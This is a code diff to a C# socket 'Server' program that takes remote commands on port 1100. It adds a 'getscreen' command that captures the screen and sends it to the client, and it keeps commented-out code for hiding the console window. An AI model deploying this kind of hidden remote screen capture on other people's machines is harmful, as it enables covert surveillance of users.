@@ -8,6 +8,10 @@ using System.Text;
 using System.Threading;
 using System.Runtime.InteropServices;
 using System.Windows;
+using System.Threading.Tasks;
+using System.Drawing;
+using System.IO;
+using System.Drawing.Imaging;
 
 namespace Server
 {
@@ -23,24 +27,30 @@ namespace Server
         const int SW_SHOW = 5;
         static void Main(string[] args)
         {
+            ConnectToClient();
+        }
+
+        private static void ConnectToClient()
+        {
+
             IPHostEntry myhost = Dns.GetHostEntry(Dns.GetHostName());
             var ip = myhost.AddressList[1];
-            Console.WriteLine("Server IP : {0} ", ip) ;
+            Console.WriteLine("Server IP : {0} ", ip);
             IPEndPoint iPEndPoint = new IPEndPoint(ip, 1100);
             Socket socket = new Socket(iPEndPoint.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
             string bytes = "";
             var handle = GetConsoleWindow();
-                  /// if you want to hide the server window, then uncomment this method
-                  /// Console.WriteLine("App after 3 seconds will be hide");
-                  /// Thread.Sleep(3000);
-                  /// ShowWindow(handle, SW_HIDE); 
+            /// if you want to hide the server window, then uncomment this method
+            /// Console.WriteLine("App after 3 seconds will be hide");
+            /// Thread.Sleep(3000);
+            /// ShowWindow(handle, SW_HIDE); 
             Console.WriteLine(bytes);
             try
             {
 
                 socket.Bind(iPEndPoint);
                 socket.Listen(2);
-                byte[] recByte = new byte[5000];
+                byte[] recByte = new byte[1500000];
                 IEnumerable<string> pros = null;
                 while (true)
                 {
@@ -92,6 +102,12 @@ namespace Server
                             listener.Send(Encoding.Unicode.GetBytes(bytes));
                             bytes = "";
                         }
+                        else if (data.ToLower().Equals("getscreen"))
+                        {
+
+                            var screen =  CaptureScreenshot();
+                            listener.Send(screen);
+                        }
                         else
                             MessageBox.Show("Wrong Command!!");
 
@@ -100,7 +116,7 @@ namespace Server
                     {
                         MessageBox.Show(ex.Message);
                     }
-                   
+
 
                     listener.Shutdown(SocketShutdown.Both);
                     listener.Close();
@@ -112,6 +128,25 @@ namespace Server
                 MessageBox.Show(ex.Message);
             }
             Console.ReadKey();
+        } 
+        private static byte[] CaptureScreenshot()
+        {
+                
+                Rectangle bounds = new Rectangle(0, 0, 1920, 1080);
+                using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
+                {
+                    using (Graphics g = Graphics.FromImage(bitmap))
+                    {
+                        g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
+                    }
+
+                    using (var stream = new MemoryStream())
+                    {
+                        bitmap.Save(stream, ImageFormat.Png);
+                        return stream.ToArray();
+                    }
+                }
+           
         }
     }
 }
